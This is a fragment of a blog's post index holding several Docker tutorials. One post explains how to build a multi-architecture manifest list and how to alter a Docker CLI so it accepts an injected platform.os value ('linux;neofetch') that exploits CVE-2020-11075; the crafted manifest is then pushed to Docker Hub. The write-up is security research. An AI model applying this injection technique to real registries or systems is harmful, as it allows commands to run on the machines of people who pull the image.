learning","Theoretical"]},{"title":"To-create-a-manifest","path":"/2023/07/4639798fdb2a.html","content":"DescriptionIn this blog post, in order to exploit CVE-2020-11075 (for more information about this vulnerability, please refer to my article on the topic), it is necessary to create a manifest list and modify its platform.os field in order to achieve shell injection. Therefore, I have written this tutorial as a reference. This blog post details the process of generating a manifest list from a dockerfile. Environments Ubuntu 22.10 x86_64 Docker 24.0.4 Steps Be careful to execute each step. After all, I don’t know whether I can reproduce it stably or not.It is essential to maintain a clean workflow. If anything unusual occurs, it is advisable to restart the entire process. PreparationHere is the dockerfile. To demonstrate the manifest, we use the busybox it self to create a new image. Prior to creating and editing a Dockerfile, it is recommended to place it in an empty and clean directory. 12FROM busybox:latestLABEL maintainer=LouisLiu Before compiling images, be sure you have a dockerhub account and use docker login to login your account. Compiling imagesIt may not be necessary to use cross-compilation to compile the image with ARM architecture on an x86 platform. Instead, you can simply use the --platform argument to compile it. Here to compile images for two different 123# Move to the directory where the Dockerfile is locatedsudo docker build --push -t iridium191/manifest_test:amd64sudo docker build --push --paltform=linux/arm -t iridium191/manifest_test:arm Assuming everything goes smoothly, you should be able to see your repository on Docker Hub. If you are using a machine with ARM architecture like Apple M1, please note that you should not use the --platform argument while compiling an ARM image. Generating manifestPrior to creating a manifest, ensure that the image name and tag do not already exist. If they do, you may need to use the --amend flag. However, it is uncertain whether this will execute smoothly. Then create a manifest list(not a manifest which is for a single image): 12sudo docker manifest create iridium191/manifest_test:mixed iridium191/manifest_test:amd64 iridium191/manifest_test:arm# Created manifest list docker.io/iridium191/manifest_test:mixed With the above command, a manifest list tagged with mixed will be created. If the command returns an error message indicating that one of the images is a manifest list, try inspecting it. In some cases, if you use buildx or add unnecessary --platform flags, the Docker engine may create a ghost image with an unknown platform.os and platform.architecture. Annotating a malicious shell(Optional) Here, I attempted to modify the platform.os field of the manifest using the recompiled Docker CLI and pushed it to GitHub. This step was taken to exploit CVE-2020-11075. During the recompilation process, I commented out the code block responsible for the legality check of the `–os`` parameter in Docker CLI.If not required, you may skip this chapter. However, if necessary, please proceed with caution and modify the command carefully to suit your specific needs.During the operation process here, I utilized the recompiled Docker CLI located at ~/cli/build/docker. Annotating the manifest: 12sudo ~/cli/build/docker manifest annotate iridium191/manifest_test:mixed iridium191/manifest_test:amd64 --os \"linux;neofetch\"# Neofetch is a command-line system information tool that displays information about your operating system, software, and hardware in a visually appealing way. To execute this command, Then try inspecting it. You should be able to see that the platform.os field has been altered to a crafted string. 1sudo ~/cli/build/docker manifest inspect iridium191/manifest_test:mixed The manifest shows: 12345678910111213141516171819202122232425{ \"schemaVersion\": 2, \"mediaType\": \"application/vnd.docker.distribution.manifest.list.v2+json\", \"manifests\": [ { \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"size\": 527, \"digest\": \"sha256:ff3a7dfa1675abda2fef94701a1d7001fa55cc38e5c510e3b7d40073ab970aa1\", \"platform\": { \"architecture\": \"amd64\", \"os\": \"linux;neofetch\" } }, { \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"size\": 527, \"digest\": \"sha256:c46c2645b7ef08dda72e6139d1815dfd52328bf51189c3f85a5348fb50547dc7\", \"platform\": { \"architecture\": \"arm\", \"os\": \"linux\", \"variant\": \"v7\" } } ]} Pushing the manifest to DockeHubThen pushing it to DockerHub: 1sudo ~/cli/build/docker manifest push iridium191/manifest_test:mixed Assuming everything went smoothly, you should be able to see the tag on Docker Hub, which contains ARM and AMD64 options. However, please note that when inspecting this tag on another machine, you may see the unchanged malicious manifest. This suggests that Docker Hub may not thoroughly check this type of malicious manifest. Resources ARM version: https://hub.docker.com/layers/iridium191/manifest_test/arm/images/sha256-c46c2645b7ef08dda72e6139d1815dfd52328bf51189c3f85a5348fb50547dc7?context=explore x86 version: https://hub.docker.com/layers/iridium191/manifest_test/amd64/images/sha256-ff3a7dfa1675abda2fef94701a1d7001fa55cc38e5c510e3b7d40073ab970aa1?context=explore Manifest version: https://hub.docker.com/layers/iridium191/manifest_test/mixed/images/sha256-ff3a7dfa1675abda2fef94701a1d7001fa55cc38e5c510e3b7d40073ab970aa1?context=explore References https://yeasy.gitbook.io/docker_practice/image/manifest https://www.zhaowenyu.com/docker-doc/reference/dockercmd/dockercmd-manifest-annotate.html https://xie.infoq.cn/article/f422632f3b72eff3bf2454f6b","tags":["Docker","Docker_CLI","Manifest"],"categories":["Cloud","Docker"]},{"title":"Instructions-to-compile-docker-cli","path":"/2023/07/e39bf54644c3.html","content":"EnvironmentDocker&gt;19.03; Use 24.0.0 here StepsCompile123git clone https://github.com/docker/cli.gitcd clisudo docker buildx bake CheckAfter the build process is complete, the Docker binary file can be found in /build. Please note that root privileges are required to execute the file. 1234sudo ls build/#docker docker-linux-amd64sudo ./build/docker version The successful completion of the compilation process is indicated.: 123456789Client: Version: 24.0.0-rc.2-142-gdf04aca5d2.m API version: 1.43 (downgraded from 1.44) Go version: go1.20.5 Git commit: df04aca5d2 Built: Tue Jul 11 03:19:56 2023 OS/Arch: linux/amd64 Context: default... Troubleshootingdocker: ‘buildx’ is not a docker command after compiling errorRef: https://askubuntu.com/questions/1467602/buildx-is-not-a-docker-command Reinstall buildx toolkits: 12sudo apt list --installed | grep buildx # Check its existancesudo apt install docker-buildx-plugin # Reinstall it dial tcp 142.251.42.241:443: connect: connection refused12345678910111213------ &gt; [goversioninfo 1/1] RUN --mount=type=cache,target=/root/.cache/go-build --mount=type=cache,target=/go/pkg/mod GOBIN=/out GO111MODULE=on go install \"github.com/josephspurrier/goversioninfo@v1.3.0\":21.45 go: github.com/josephspurrier/goversioninfo@v1.3.0: github.com/josephspurrier/goversioninfo@v1.3.0: Get \"https://proxy.golang.org/github.com/josephspurrier/goversioninfo/@v/v1.3.0.info\": dial tcp 142.251.42.241:443: connect: connection refused------Dockerfile:41-------------------- 40 | ARG GOVERSIONINFO_VERSION 41 | &gt;&gt;&gt; RUN --mount=type=cache,target=/root/.cache/go-build \\ 42 | &gt;&gt;&gt; --mount=type=cache,target=/go/pkg/mod \\ 43 | &gt;&gt;&gt; GOBIN=/out GO111MODULE=on go install \"github.com/josephspurrier/goversioninfo@${GOVERSIONINFO_VERSION}\" 44 | #GOBIN=/out GO111MODULE=on go install \"github.com/josephspurrier/goversioninfo/cmd/goversioninfo@${GOVERSIONINFO_VERSION}\"--------------------ERROR: failed to solve: process \"/bin/sh -c GOBIN=/out GO111MODULE=on go install \\\"github.com/josephspurrier/goversioninfo@${GOVERSIONINFO_VERSION}\\\"\" did not complete successfully: exit code: 1 Upon reviewing the error output, the issue was traced to line 41 of the Dockerfile. It was discovered that access to the goproxy was denied. To resolve this issue, an environment variable was added, redirecting to a local proxy. 12345678# /dockerfile# ...FROM build-base-${BASE_VARIANT} AS goversioninfoARG GOVERSIONINFO_VERSIONRUN --mount=type=cache,target=/root/.cache/go-build \\ --mount=type=cache,target=/go/pkg/mod \\ GOBIN=/out GO111MODULE=on GOPROXY=https://goproxy.cn,direct go install \"github.com/josephspurrier/goversioninfo/cmd/goversioninfo@${GOVERSIONINFO_VERSION}\" #GOBIN=/out GO111MODULE=on go install \"github.com/josephspurrier/goversioninfo/cmd/goversioninfo@${GOVERSIONINFO_VERSION}\" References https://blog.csdn.net/blake321/article/details/120758613","tags":["Docker","Docker_CLI"],"categories":["Cloud","Docker"]},{"title":"Install Docker with given version","path":"/2023/07/a3e10d01f67b.html","content":"Environment Ubuntu 22.10 x86_64 Removing older version(Optional)12sudo apt-get autoremove docker docker-ce docker-engine docker.io containerd runcsudo apt-get update Preparing &amp; Listing versions can be installed directlyAdd repository via GPG 12345sudo apt-get updatesudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-commoncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"sudo apt-get update Listing all avaliable versions 1sudo apt-cache madison docker-ce It returns: 1234docker-ce | 5:24.0.4-1~ubuntu.22.10~kinetic | https://download.docker.com/linux/ubuntu kinetic/stable amd64 Packagesdocker-ce | 5:24.0.4-1~ubuntu.22.10~kinetic | https://download.docker.com/linux/ubuntu kinetic/test amd64 Packagesdocker-ce | 5:24.0.3-1~ubuntu.22.10~kinetic | https://download.docker.com/linux/ubuntu kinetic/stable amd64 Packages... Installing the newest version12curl -fsSL https://test.docker.com -o test-docker.shsudo sh test-docker.sh Installing a version listed in the version list12sudo apt-get install docker-ce=5:20.10.7~3-0~ubuntu-xenial# Replace the version to target version Installing a version not listed(older) in the version listConveniently install older versions by using Metarget . After installing metarget and dependencies: 12./metarget gadget install docker --version 18.03.1# Replace the version to target version Reference https://www.runoob.com/docker/ubuntu-docker-install.html","tags":["Docker"],"categories":["Cloud","Docker"]},{"title":"test-pages","path":"/2023/07/4791e010a6f6.html","content":"DescriptionThis is a page to test the theme’s layout and highlight h2h3 Across the great wall we can reach every corner of the world A quick fox jumps over the lazy dog. A quick fox jumps over the lazy dog. 12345#include &lt;stdio.h&gt;void main(){ printf(\"Hello world!\"); return;}"}]